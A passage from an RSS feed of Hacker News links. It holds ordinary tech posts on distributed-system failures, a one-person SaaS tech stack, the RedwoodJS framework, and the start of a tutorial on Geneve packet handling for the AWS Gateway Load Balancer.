	<li><a lang="fr-FR" hreflang="fr-FR" href="https://011.video/fr/">Français</a></li>
</ul>
	</div><!-- .entry-content -->
</article></div>]]>
            </description>
            <link>https://011.video/2020/11/22/replace-any-object-from-a-video-by-a-transparent-background/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25186460</guid>
            <pubDate>Mon, 23 Nov 2020 13:22:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Things that will go wrong in a distributed system]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25186443">thread link</a>) | @evuez
<br/>
November 23, 2020 | https://liftm.io/posts/things-that-will-go-wrong-in-a-distributed-system.html | <a href="https://web.archive.org/web/*/https://liftm.io/posts/things-that-will-go-wrong-in-a-distributed-system.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      
        <time datetime="2020-11-22">2020-11-22</time>
      <p>A (very) incomplete list of things that will go wrong in any distributed system.</p>
<p>Feel free to <a href="https://github.com/evuez/evuez.github.io/blob/master/posts/things-that-will-go-wrong-in-a-distributed-system.md">submit a PR</a> to add more failure cases to this list.</p>

<ul>
<li>The network will be partitioned</li>
<li>Latency will grow more than expected</li>
<li>Timeouts will happen on nodes that are alive</li>
<li>Your network bandwidth is limited, and you will hit that limit</li>
</ul>

<ul>
<li>Clocks will go backward</li>
<li>Monotonic clocks will go backward <a href="https://rachelbythebay.com/w/2020/10/20/ticktock/">[1]</a>, <a href="https://github.com/rust-lang/rust/pull/56988">[2]</a></li>
<li>Clocks will be out of sync, by more than a few seconds sometimes</li>
<li>Your NTP server will die</li>
<li>You will have timezone issues</li>
</ul>

<ul>
<li><a href="http://static.googleusercontent.com/media/research.google.com/en//archive/disk_failures.pdf">HDDs will fail</a></li>
<li><a href="https://arxiv.org/pdf/1901.03401.pdf">RAMs will fail</a></li>
<li><a href="https://www.microsoft.com/en-us/research/wp-content/uploads/2016/02/eurosys84-nightingale.pdf">CPUs will fail</a></li>
</ul>

<ul>
<li>Without <a href="https://wiki.postgresql.org/wiki/SSI">SSI</a>, you will have inconsistencies</li>
<li>Without <a href="https://wiki.postgresql.org/wiki/SSI">SSI</a>, you will lose data</li>
<li>Without a proper consensus, you will have more than one leader</li>
<li>Without <a href="https://en.wikipedia.org/wiki/Linearizability">linearizability</a>, clients will time travel</li>
<li>Without <a href="https://en.wikipedia.org/wiki/Two-phase_commit_protocol">2PC</a>, you will have inconsistencies</li>
</ul>

    </article></div>]]>
            </description>
            <link>https://liftm.io/posts/things-that-will-go-wrong-in-a-distributed-system.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25186443</guid>
            <pubDate>Mon, 23 Nov 2020 13:20:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Tech Stack of a One-Man SaaS]]>
            </title>
            <description>
<![CDATA[
Score 466 | Comments 245 (<a href="https://news.ycombinator.com/item?id=25186342">thread link</a>) | @amzans
<br/>
November 23, 2020 | https://panelbear.com/blog/tech-stack/ | <a href="https://web.archive.org/web/*/https://panelbear.com/blog/tech-stack/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Being an engineer at heart, each time I see a company write about their tech stack, I brew a fresh cup of coffee, sit back and enjoy reading the newfound little treat.</p><p>There’s just something fascinating about getting to know what’s under the hood of other people’s businesses. It’s like gossip, but about software.</p><p>A couple of months ago I started working on <a href="https://panelbear.com/blog/why-panelbear/" target="_blank" rel="noopener">yet another private analytics service</a>, a project which has gone through numerous iterations, and I feel lucky that 400+ websites have already integrated with it, even though it's still in the early stages.</p><p>That’s why, in the same spirit as Jake Lazaroff’s <a href="https://jake.nyc/words/tools-and-services-i-use-to-run-my-saas/" target="_blank" rel="noopener">Tools and Services I Use to Run My SaaS</a>, I thought it’s now my turn to do a short write up of the technologies I’m using to run this new service.</p><h2>Languages</h2><p>Over the years I have added many programming languages to my toolbelt, but for solo projects I have converged to two in particular that strike a good balance of productivity and reliability.</p><ul><li><p><a href="https://python.org/" target="_blank" rel="noopener">Python</a>: Most of the backend code is in Python. Which has enabled me to ship features incredibly fast. Additionally, I use <a href="http://mypy-lang.org/" target="_blank" rel="noopener">mypy</a> for optional type hints, which helps keep the codebase manageable.</p></li><li><p><a href="https://www.typescriptlang.org/" target="_blank" rel="noopener">Typescript</a>: I used to avoid working on the frontend as much as I could. That is until I discovered Typescript about 4 years ago. It just makes the whole experience a lot better, and I now use it for all my projects together with React.</p></li></ul><h2>Frameworks and libraries</h2><p>This list could have been huge, as I stand on the shoulders of giants who have published the vast amount of open-source code which I rely on. But I'd like to highlight only a handful due to their major role in the stack:</p><ul><li><a href="https://www.djangoproject.com/" target="_blank" rel="noopener">Django</a>: It's like a superpower for solo developers. The longer you work in this industry, the more you appreciate not having to reinvent the wheel for the 100th time. A monolithic framework can get you <a href="https://instagram-engineering.com/web-service-efficiency-at-instagram-with-python-4976d078e366" target="_blank" rel="noopener">really</a>, <a href="https://github.com/getsentry/sentry" target="_blank" rel="noopener">really</a> <a href="https://djangostars.com/blog/10-popular-sites-made-on-django/" target="_blank" rel="noopener">far</a>. To me, it's about predictable software that's fast in every way that matters. In case you're interested, I talk more about this topic on <a href="https://panelbear.com/blog/boring-tech/" target="_blank" rel="noopener">Choose Boring Technology</a>.</li><li><a href="https://reactjs.org/" target="_blank" rel="noopener">React</a>: The web app for the dashboards is built using React + Webpack. After using Angular for a long time, I switched to React because it's just a pluggable view layer that doesn't get in the way. I use the fantastic <a href="https://github.com/Frojd/django-react-templatetags" target="_blank" rel="noopener">django-react-templatetags</a> to embed the React components in my Django templates.</li><li><a href="https://nextjs.org/" target="_blank" rel="noopener">NextJS</a>: I use it for the landing pages, documentation and the blog which you are currently reading. It enables me to re-use various React components, and still reap the performance and SEO benefits of a statically generated site.</li><li><a href="https://docs.celeryproject.org/" target="_blank" rel="noopener">Celery</a>: I use it for any kind of background/scheduled tasks. It does have a learning curve for more advanced use-cases, but it's quite reliable once you understand how it works, and more importantly when it fails.</li><li><a href="https://getbootstrap.com/" target="_blank" rel="noopener">Bootstrap 4</a>: I built a custom theme on top of Bootstrap. It has saved me a lot of time, and there's lots of documentation around it. That's why I picked it.</li></ul><h2>Databases</h2><p>I originally stored all data in a single SQLite database, doing backups meant making a copy of this file to an object storage like S3. At the time, it was more than enough for the small sites I tested Panelbear with. But as I added more features and websites, I needed more specialized software to support those features:</p><ul><li><a href="https://clickhouse.tech/" target="_blank" rel="noopener">Clickhouse</a>: I believe this is one of those technologies that over time will become ubiquitous. It's honestly a fantastic piece of software that enabled me to build features that initially seemed impossible on low-cost hardware. I do intend to write a future blog post on some lessons learned from running Clickhouse on Kubernetes. So stay tuned!</li><li><a href="https://www.postgresql.org/" target="_blank" rel="noopener">PostgreSQL</a>: My go-to relational database. Sane defaults, battle-tested, and deeply integrated with Django. For Panelbear, I use it for all application data that is not analytics related. For the analytics data, I instead wrote a simple interface for querying Clickhouse within Django.</li><li><a href="https://redis.io/" target="_blank" rel="noopener">Redis</a>: I use it for many things: caching, rate-limiting, as a task queue, and as a key/value store with TTL for various features. Rock-solid, and great documentation.</li></ul><h2>Deployment</h2><p>I treat my infrastructure as <a href="https://joachim8675309.medium.com/devops-concepts-pets-vs-cattle-2380b5aab313" target="_blank" rel="noopener">cattle instead of pets</a>, things like servers and clusters are meant to come and go. So if one server gets "sick", I just replace it with another one. That means everything is described as code in a git repo, and I do not change things by SSH'ing into the servers. You can think of it like a template to clone my entire infrastructure with one command into any AWS region/environment.</p><p>This also helps me in case of disaster recovery. I just run a few commands, and some minutes later my stack has been re-created. This was particularly useful when I moved from DigitalOcean, to Linode, and recently to AWS. Everything is described in code, so it's easy to keep track of what components I own, even years later (all companies have some AWS IAM policy or VPC subnet lurking around which was created via clicky-clicky on the UI, and now everyone depends on it).</p><ul><li><a href="https://www.terraform.io/" target="_blank" rel="noopener">Terraform</a>: I manage most of my cloud infrastructure with Terraform. Things like EKS clusters, S3 buckets, roles, and RDS instances are declared in my Terraform manifests. The state is synced to an encrypted S3 bucket to avoid getting in trouble in case something happens to my development laptop.</li><li><a href="https://www.docker.com/" target="_blank" rel="noopener">Docker</a>: I build everything as Docker images. Even stateful components like Clickhouse or Redis are packaged and shipped as Docker containers to my cluster. It also makes my stack very portable, as I can run it anywhere I can run Docker.</li><li><a href="https://kubernetes.io/" target="_blank" rel="noopener">Kubernetes</a>: Allowed me to simplify the operational aspects tremendously. However, I wouldn’t bindly recommend it to everyone, as I already felt comfortable working with it after having the pleasure of putting down multiple production fires for my employer over the years. I also rely on managed offerings, which helps reduce the burden too.</li><li><a href="https://github.com/features/actions" target="_blank" rel="noopener">GitHub Actions</a>: Normally I’d use <a href="https://circleci.com/" target="_blank" rel="noopener">CircleCI</a> in the past (which is also great), but for this project I prefer to use GitHub Actions as it removes yet another service which needs to have access to my repositories, and deployment secrets. However, CircleCI has plenty of good features, and I still recommend it.</li></ul><h2>Infrastructure</h2><p>I started in a single $5/mo instance in DigitalOcean, then moved to the managed Kubernetes offering as I was reinventing the wheel for a lot of things Kubernetes already gives me out of the box (service discovery, TLS certs, load balancing, log rotation, rollout, scaling, fault-tolerance, among others).</p><p>Unfortunately, I had <a href="https://www.digitalocean.com/community/questions/kubernetes-unable-to-connect-to-the-server" target="_blank" rel="noopener">reliability issues</a> with DigitalOcean's Kubernetes offering, even on larger instances. The cluster API would often go down randomly and no longer recover, this disrupted a lot of cluster services including the load balancer, which translated into downtime for me. I had to create a new cluster each time this happened, and while Terraform made it trivial, this was not something that inspired a lot of confidence about their managed service. I suspect their control plane was underprovisioned, which would be kind of understandable given the price tag.</p><p>Unfortunately I was not able to resolve the issue after several weeks. That's why I decided to move to <a href="https://www.linode.com/" target="_blank" rel="noopener">Linode</a>, and had exactly 0 problems during the 1.5 month-long honeymoon that followed.</p><p>However, I recently moved once again, this time to AWS due to a pretty good deal I received. It also enabled me to use managed services like RDS to offload managing PostgreSQL, which is a big plus. What made all these migrations relatively easy, was that all my infrastructure was described via Terraform and Kubernetes manifests. The migrations essentially consisted of an evening, some tea, and patience. But that's for another post.</p><ul><li><a href="https://aws.amazon.com/" target="_blank" rel="noopener">AWS</a>: Predictable, and lots of managed services. However, I use it at my full-time job, so I didn't have to spend too much time figuring things out. The main services I use are EKS, ELB, S3, RDS, IAM and private VPCs. I might also add Cloudfront and Kinesis in the future.</li><li><a href="https://www.cloudflare.com/" target="_blank" rel="noopener">Cloudflare</a>: I mainly use it for DDoS protection, serving DNS, and offloading edge caching of various static assets (currently shaves off 80% of the egress charges from AWS - their bandwidth pricing is insane!).</li><li><a href="https://letsencrypt.org/" target="_blank" rel="noopener">Let’s Encrypt</a>: Free SSL certificate authority. I use cert-manager in my Kubernetes cluster to automatically issue and renew certificates based on my ingress rules.</li><li><a href="https://www.namecheap.com/" target="_blank" rel="noopener">Namecheap</a>: My domain name registrar of choice. Allows MFA for login which is an important security feature. Unlike other registrars, they haven't surprised me with an expensive renewal every few years. I like them.</li></ul><h2>Kubernetes components</h2><p>The following components automate most of the devops work for me. I use several others too, but some of the main ones I use are:</p><ul><li><a href="https://github.com/kubernetes/ingress-nginx/" target="_blank" rel="noopener">ingress-nginx</a>: Rock-solid ingress controller for Kubernetes using NGINX as a reverse proxy, and load balancer. Sits behind the NLB which controls ingress to the cluster nodes.</li><li><a href="https://github.com/jetstack/cert-manager" target="_blank" rel="noopener">cert-manager</a>: Automatically issue/renew TLS certs as defined in my ingress rules.</li><li><a href="https://github.com/kubernetes-sigs/external-dns" target="_blank" rel="noopener">external-dns</a>: Synchronizes exposed Kubernetes Services and Ingresses with DNS providers (such as Cloudflare).</li><li><a href="https://github.com/prometheus-operator/prometheus-operator" target="_blank" rel="noopener">prometheus-operator</a>: Automatically monitors most of my services, and exposes dashboards via Grafana.</li><li><a href="https://fluxcd.io/" target="_blank" rel="noopener">flux</a>: GitOps way to do continuous delivery in Kubernetes. Basically pulls and deploys new Docker images when I release them.</li></ul><h2>CLI tools</h2><p>There’s plenty here, but frequently used include:</p><ul><li><a href="https://kubernetes.io/" target="_blank" rel="noopener">kubectl</a>: To interact with the Kubernetes cluster to watch logs, pods and services, SSH into a running container, and so on.</li><li><a href="https://github.com/wercker/stern" target="_blank" rel="noopener">stern</a>: Multi pod log tailing for Kubernetes. Really handy.</li><li><a href="https://htop.dev/" target="_blank" rel="noopener">htop</a>: Interactive system process viewer. Better than “top” if you ask me.</li><li><a href="https://curl.se/" target="_blank" rel="noopener">cURL</a>: Issue HTTP requests locally, inspect headers.</li><li><a href="https://httpie.io/" target="_blank" rel="noopener">HTTPie</a>: Like cURL, but simpler for JSON APIs.</li><li><a href="https://github.com/rakyll/hey" target="_blank" rel="noopener">hey</a>: Load testing HTTP endpoints. Gives a nice latency distribution summary.</li></ul><h2>Monitoring</h2><ul><li><a href="https://prometheus.io/" target="_blank" rel="noopener">Prometheus</a>: Efficient storage of time series data for monitoring. Tracks all the cluster and app metrics. It was a lot cheaper than using Cloudwatch for app metrics.</li><li><a href="https://grafana.com/" target="_blank" rel="noopener">Grafana</a>: Nice dashboards for the Prometheus monitoring data. All dashboards are described in JSON files and versioned in the …</li></ul></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://panelbear.com/blog/tech-stack/">https://panelbear.com/blog/tech-stack/</a></em></p>]]>
            </description>
            <link>https://panelbear.com/blog/tech-stack/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25186342</guid>
            <pubDate>Mon, 23 Nov 2020 13:06:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GitHub co-founder is building a full-stack, serverless framework – RedwoodJS]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25186261">thread link</a>) | @oczek
<br/>
November 23, 2020 | https://blog.graphqleditor.com/redwoodjs/ | <a href="https://web.archive.org/web/*/https://blog.graphqleditor.com/redwoodjs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Jamstack is a new architectural approach with the core principle of pre-rendering aiming to make web applications to:</p>
<ul>
<li>run faster,</li>
<li>be more secure,</li>
<li>be easier to scale.</li>
</ul>
<p>All that achieved with the use of many modern tools to bring productivity to the maximum. Sounds interesting right? This approach is gaining a lot of popularity which makes a market for new tooling supporting the Jamstack approach. RedwoodsJS is one of the new shining stars, its team believes that JAMstack is a huge leap forward in web development and they are doing their best to make it even more pleasant to work with.</p>
<h2>RedwoodJS</h2>
<p>Redwood is an open-source project initiated by <strong>Tom Preston-Werner, the co-founder of GitHub &amp; creator of Jekyll</strong> - one of the first static site generators. So what is Redwood?</p>
<blockquote>
<p><em>Imagine a React frontend, statically delivered by CDN, that talks via GraphQL to your backend running on AWS Lambdas around the world, all deployable with just a git push—that’s Redwood.</em></p>
</blockquote>
<p>RedwoodJS is a highly opinionated, full-stack, serverless web application framework that aims to make building and deploying JAMstack apps as easy as possible. </p>
<h2>The stack</h2>
<p>RedwoodJS uses some of the most popular cutting-edge technologies and by giving up the freedom of choosing your tech stack, you are gaining a significant reduction of the level of complexity of setting up all services to make your infrastructure work as intended:</p>
<ul>
<li><strong>Frontend</strong> - this part is covered by React supported by Apollo and it has a lot of code generators involved which let you create everything i.e. routes, pages, cells (even with already pre-configured tests) out of the box.</li>
<li><strong>Backend</strong> - it’s becoming difficult to talk about cutting-edge technologies without putting GraphQL into the equation. Redwood uses Prisma for its GraphQL backend, enabling quick creation of backends with graphical interfaces.</li>
<li><strong>Deployment</strong> - Redwood’s development team has support for several deployment targets on their roadmap with a top-priority to make deployment strategies in a way that makes it easy for additional targets to be added, as well as to make it easy to adjust to user’s own deployment strategy. Right now it offers out of the box deployment to Netlify and Vercel, with AWS and Google Cloud Run high on their road map.</li>
</ul>
<p><span>
      <a href="https://blog.graphqleditor.com/static/107a55dd3ef68a5e3709cb776c31e41d/a3767/redwood_structure.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Diagram presenting RedwoodJS structure" title="Diagram presenting RedwoodJS structure" src="https://blog.graphqleditor.com/static/107a55dd3ef68a5e3709cb776c31e41d/fcda8/redwood_structure.png" srcset="https://blog.graphqleditor.com/static/107a55dd3ef68a5e3709cb776c31e41d/12f09/redwood_structure.png 148w,
https://blog.graphqleditor.com/static/107a55dd3ef68a5e3709cb776c31e41d/e4a3f/redwood_structure.png 295w,
https://blog.graphqleditor.com/static/107a55dd3ef68a5e3709cb776c31e41d/fcda8/redwood_structure.png 590w,
https://blog.graphqleditor.com/static/107a55dd3ef68a5e3709cb776c31e41d/efc66/redwood_structure.png 885w,
https://blog.graphqleditor.com/static/107a55dd3ef68a5e3709cb776c31e41d/c83ae/redwood_structure.png 1180w,
https://blog.graphqleditor.com/static/107a55dd3ef68a5e3709cb776c31e41d/a3767/redwood_structure.png 1210w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<h5>Source: <a href="https://redwoodjs.com/">redwoodjs.com</a></h5>
<h2>Concepts &amp; features</h2>
<p>Redwood features a lot of new interesting concepts as well as brings a breath of fresh air to well-known ones. One of the most interesting ones are definitely:</p>
<ul>
<li><strong>Cells</strong> - they are one of the signature modes of abstraction in Redwood. Cells represent a declarative approach to data fetching which creates space (by providing conventions around data fetching) in between the request and the response which Redwood can utilize to perform its optimizations. All of this without writing a line of imperative code.</li>
</ul>
<p><span>
      <a href="https://blog.graphqleditor.com/static/55fbb6196d36823b27369fe2634057dd/00d43/cells.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="RedwoodJS cells concept" title="RedwoodJS cells concept" src="https://blog.graphqleditor.com/static/55fbb6196d36823b27369fe2634057dd/fcda8/cells.png" srcset="https://blog.graphqleditor.com/static/55fbb6196d36823b27369fe2634057dd/12f09/cells.png 148w,
https://blog.graphqleditor.com/static/55fbb6196d36823b27369fe2634057dd/e4a3f/cells.png 295w,
https://blog.graphqleditor.com/static/55fbb6196d36823b27369fe2634057dd/fcda8/cells.png 590w,
https://blog.graphqleditor.com/static/55fbb6196d36823b27369fe2634057dd/efc66/cells.png 885w,
https://blog.graphqleditor.com/static/55fbb6196d36823b27369fe2634057dd/00d43/cells.png 1000w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<h5>Source: <a href="https://redwoodjs.com/">redwoodjs.com</a></h5>
<ul>
<li><strong>Redwood Router</strong> -  Redwood features its own router that took inspiration from React Router, Ruby on Rails and Reach Router. It brings some awesome innovation to this crucial part of your app.</li>
</ul>
<p><span>
      <a href="https://blog.graphqleditor.com/static/de333840fbfc693cbad484ca4193032a/00d43/router.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Router in RedwoodJS" title="Router in RedwoodJS" src="https://blog.graphqleditor.com/static/de333840fbfc693cbad484ca4193032a/fcda8/router.png" srcset="https://blog.graphqleditor.com/static/de333840fbfc693cbad484ca4193032a/12f09/router.png 148w,
https://blog.graphqleditor.com/static/de333840fbfc693cbad484ca4193032a/e4a3f/router.png 295w,
https://blog.graphqleditor.com/static/de333840fbfc693cbad484ca4193032a/fcda8/router.png 590w,
https://blog.graphqleditor.com/static/de333840fbfc693cbad484ca4193032a/efc66/router.png 885w,
https://blog.graphqleditor.com/static/de333840fbfc693cbad484ca4193032a/00d43/router.png 1000w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<h5>Source: <a href="https://redwoodjs.com/">redwoodjs.com</a></h5>
<p>If you interested in more detailed information about Redwood’s concepts and its implementation make sure to visit <a href="https://redwoodjs.com/docs/introduction">the official docs</a>.</p>
<h2>Not a 1.0 version</h2>
<p>RedwoodJS software has not reached a stable version 1.0 yet.
Its team put Redwood in the later stages of the “make it work” phase in the “make it work; make it right; make it fast” paradigm. Although this makes it not suitable for production use, Redwood is a concept that is definitely worth following.</p></div><p>The GraphQL Editor is a supportive tool for both advanced GraphQL users as well as those taking their first steps with GraphQL APIs. Our all-in-one development environment for GraphQL will help you build, manage &amp; deploy your GraphQL API much faster thanks to dozens of built-in micro features. Its graphical interface will also fix communication within your product team. Visualization is the key!</p></div>]]>
            </description>
            <link>https://blog.graphqleditor.com/redwoodjs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25186261</guid>
            <pubDate>Mon, 23 Nov 2020 12:57:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to build a proxy application for the new AWS Gateway Load Balancer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25186242">thread link</a>) | @donkersgood
<br/>
November 23, 2020 | https://www.sentiatechblog.com/geneveproxy-an-aws-gateway-load-balancer-reference-application | <a href="https://web.archive.org/web/*/https://www.sentiatechblog.com/geneveproxy-an-aws-gateway-load-balancer-reference-application">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><!--## GeneveProxy - an AWS Gateway Load Balancer reference application -->
<p>The AWS Gateway Load Balancer (GWLB) allows AWS users to route VPC traffic through a centralized appliance. This appliance can perform monitoring, throttling and deep packet inspection. To achieve this, the appliance needs to support Geneve encapsulation and decapsulation. In this post we will provide a blueprint for a Python application with full Geneve support.</p>
<p>Reading the AWS Gateway Load Balancer <a rel="noopener noreferrer" href="https://aws.amazon.com/elasticloadbalancing/gateway-load-balancer/">product page</a> and <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/elasticloadbalancing/latest/gateway/introduction.html">documentation</a>, you will find that the product is strongly marketed towards third-party appliances. In other words, you purchase an appliance from a third-party vendor (often at a hefty price) and use their product to monitor and inspect your traffic. But as <a rel="noopener noreferrer" href="https://twitter.com/QuinnyPig">Corey Quinn</a> wrote in <a rel="noopener noreferrer" href="https://www.lastweekinaws.com/blog/what-i-dont-get-about-the-aws-gateway-load-balancer/">his post</a> “What I Don’t Get about the AWS Gateway Load Balancer”:</p>
<blockquote>
<p>A (very!) careful reading of the documentation indicates that you aren’t required to go cross-account with these devices, and that there’s no requirement that the appliances actually be third party.</p>
</blockquote>
<p>For this article I have built exactly that: a first party application, written in Python, which receives traffic from the GWLB, decapsulates the packet, inspects the packet, re-encapsulates it and returns it to the GWLB. The application is called GeneveProxy, and its full source code can be found on the Github <a rel="noopener noreferrer" href="https://github.com/sentialabs/geneve-proxy">GeneveProxy project page</a>. Any code in this article is taken directly from this project. The purpose of this application is to provide a reference on how to process Geneve headers and how to interact with the AWS Gateway Load Balancer.</p>
<p>In the article below we will describe the full process of routing, encapsulation and packet inspection. We will do this by following an example packet from a source EC2 instance, through PrivateLink, to the GWLB, to the appliance, back to the GWLB and PrivateLink, and out to the internet.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/6iysA8pOA9MnruSIYjHNXN/59f0c728a130fa204804eb8854a3f595/overview.png?fit=scale&amp;w=920" alt="Overview"></p>
<p>I will not go into how to build the infrastructure, because this is pretty well documented on the Gateway Load Balancer <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/elasticloadbalancing/latest/gateway/getting-started.html">Getting Started</a> page.</p>
<h3>Packets and headers</h3>
<p>When the source EC2 instance executes a <code>GET http://google.com</code>, a new packet is sent out on the wire (1). This packet consists of the HTTP request with a TCP header and an IPv4 header:</p>
<pre><code>IPv4 Header
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version| IHL=5 |    DSCP   |ECN|        Total Length=76        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live | Protocol = 6  |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                  Source Address=10.1.0.152                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             Destination Address=209.85.202.138                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

TCP header
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       Source Port=51714       |      Destination Port=80      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Data |           |U|A|P|R|S|F|                               |
| Offset| Reserved  |R|C|S|S|Y|I|            Window             |
|       |           |G|K|H|T|N|N|                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Checksum            |         Urgent Pointer        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options                    |    Padding    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

HTTP data
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             data                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<p>The route tables for the source EC2 instance determine this packet needs to be routed to the public internet. The route tables have been configured to forward this traffic to the PrivateLink endpoint for the Gateway Load Balancer.</p>
<p>When the packet arrives at the GWLB, it adds three additional headers. First the Geneve header, then an UDP header, and finally an outer IPv4 header. Then the packet is put on the wire again (3). The new headers direct the traffic towards the Appliance EC2 instance:</p>
<pre><code>Outer IPv4 Header
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version| IHL=5 |    DSCP   |ECN|        Total Length=60        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live | Protocol = 17 |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                  Source Address=10.0.0.230                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|               Destination Address=10.0.10.132                 |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

UDP Header
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       Source Port=24810       |     Destination Port=6081     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Length=108           |           Checksum            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Geneve Header
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Ver| Opt Len=8 |O|C|    Rsvd.  |  Protocol Type=0x0800 (IPv4)  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       Virtual Network Identifier (VNI)=0      |    Reserved   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       Option Class=0x0108     |     Type=1    |R|R|R| Length=2|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      64-bit GWLBE ENI ID                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       Option Class=0x0108     |     Type=2    |R|R|R| Length=2|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|              64-bit Customer Visible Attachment ID            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       Option Class=0x0108     |     Type=3    |R|R|R| Length=1|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      32-bit Flow Cookie                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Inner IPv4 Header
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version| IHL=5 |    DSCP   |ECN|        Total Length=60        |
